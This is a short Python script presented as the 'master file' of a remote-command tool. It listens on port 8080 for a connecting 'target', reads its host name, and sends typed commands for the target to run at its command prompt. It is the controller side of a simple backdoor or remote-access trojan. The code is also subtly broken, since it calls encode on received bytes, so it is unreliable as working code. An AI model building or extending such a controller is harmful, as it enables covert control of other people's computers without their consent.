# Master file - run this on your computer
import socket
import sys
import os

s = socket.socket()

host = socket.gethostname()

port = 8080

s.bind(('', port))

print("Waiting for connections...")

s.listen()

conn, addr = s.accept()

print(addr, "is connected to the server")
targetname = conn.recv(1024)
print("Host name is: " + targetname.encode())
print("Commands are:")
print("1. cmd(string, interger) - runs the command prompt command (string) interger amount of times")
while True:
    try:
        command = input("Enter Command: ")
        if command == "close":
            s.close()
            break
        conn.send(command.encode())
        print("Command has been sent successfully!")
        data = conn.recv(1024)
        if data:
            print("Command was received successfully!")
    except Exception as e:
        break
exit()
